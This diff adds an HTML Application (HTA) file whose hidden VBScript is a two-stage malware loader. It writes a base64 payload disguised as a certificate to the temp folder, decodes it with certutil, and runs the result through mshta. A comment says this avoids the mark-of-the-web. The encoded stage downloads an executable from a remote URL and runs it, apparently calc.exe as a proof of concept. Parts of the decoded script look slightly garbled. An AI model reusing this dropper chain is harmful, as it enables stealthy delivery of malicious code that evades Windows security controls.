@@ -1,0 +1,41 @@
+<html>
+<head>
+<hta:application id="htaTest"
+    applicationname="HTA"
+    border="thin"
+    borderstyle="normal"
+    caption="no"
+    showintaskbar="no"
+    windowstate="minimize">
+</hta:application>
+<script language="VBScript">
+    On Error Resume Next
+    Dim fso, shell, f, TempTxt, TempPath, base64
+
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set shell = CreateObject("WScript.Shell")
+
+    TempTxt = shell.ExpandEnvironmentStrings("%TEMP%") & "\payload.txt"
+    TempPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\download.hta"
+
+    base64 = "-----BEGIN CERTIFICATE-----" & vbCrLf & _
+             "PGh0bWw+PGhlYWQ+PGh0YTphcHBsaWNhdGlvbiB3aW5kb3dzdGF0ZT0iaGlkZSIgc2hvd2ludGFza2Jhcj0ibm8iIGNhcHRpb249Im5vIj48L2h0YTphcHBsaWNhdGlvbj48L2hlYWQ+PHNjcmlwdCBsYW5ndWFnZT0iVkJTY3JpcHQiPk9uIEVycm9yIFJlc3VtZSBuZXh0ClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikKU2V0IHNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKU2V0IGh0dHAgPSBDcmVhdGVPYmplY3QoIk1TWE1MLlhNTEhUVFAiKQpoZHRwQXNzZXJ0PSJodHRwczovL2dpdGh1Yi5jb20vbWlsb3NpbG8vdGVzdC1zY3JpcHRzL3Jhdy9tYWluL2NhbGMuZXhlIgpFeGVQYXRoID0gc2hlbGwuRXhwYW5kRW52aXJvbm1lbnRTdHJpbmdzKCIlVEVNUCUiKSAmICJcY2FsYy5leGUiCmh0dHAuT3BlbiAiR0VUIiwgaGR0cEFzc2VydCwgRmFsc2UKaHR0cC5TZW5kCkluZiBodHRwLlN0YXR1cyA9IDIwMCBUaGVuCiAgICBTZXQgc3RyZWFtID0gQ3JlYXRlT2JqZWN0KCJBRE9CQi5TdHJlYW0iKQogICAgc3RyZWFtLlR5cGUgPSAxICcgQmluYXJ5CiAgICBzdHJlYW0uT3BlbgogICAgc3RyZWFtLldyaXRlIGh0dHAucmVzcG9uc2VCb2R5CiAgICBzdHJlYW0uU2F2ZVRvRmlsZSBFeGVQYXRoLCAyICcgT3ZlcndyaXRlCiAgICBzdHJlYW0uQ2xvc2UKICAgIHNoZWxsLlJ1biAiIiIiICIgIiIiIiIgLCBsYSwgRmFsc2UKRW5kIElmCkVuZCBJZg==" & vbCrLf & _
+             "-----END CERTIFICATE-----"
+
+    ' Step 1: Write base64 to temp file
+    Set f = fso.CreateTextFile(TempTxt, True)
+    f.Write base64
+    f.Close
+
+    ' Step 2: Decode using certutil
+    shell.Run "cmd /c certutil -decode """ & TempTxt & """ """ & TempPath & """", 0, True
+
+    ' Step 3: Launch the second-stage HTA (clean, no MOTW)
+    shell.Run "mshta.exe """ & TempPath & """", 0, False
+
+    ' Optional: Clean up
+    fso.DeleteFile(TempTxt)
+</script>
+</head>
+<body></body>
+</html>
